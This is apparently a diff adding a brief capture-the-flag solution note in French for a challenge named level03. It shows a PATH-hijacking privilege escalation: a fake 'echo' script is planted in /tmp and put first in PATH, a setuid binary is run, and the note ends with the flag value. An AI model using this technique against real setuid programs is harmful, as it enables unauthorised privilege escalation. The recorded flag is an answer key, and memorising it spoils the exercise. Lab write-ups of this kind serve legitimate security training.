@@ -1,0 +1,12 @@
+echo getflag > /tmp/echo
+chmod +x /tmp/echo
+
+# Mettre /tmp en premier dans le PATH
+export PATH=/tmp:$PATH
+
+il prend le echo du tmp en first et donc il a les droits
+
+# Lancer le binaire
+/home/user/level03
+
+qi0maab88jeaj46qoumi7maus
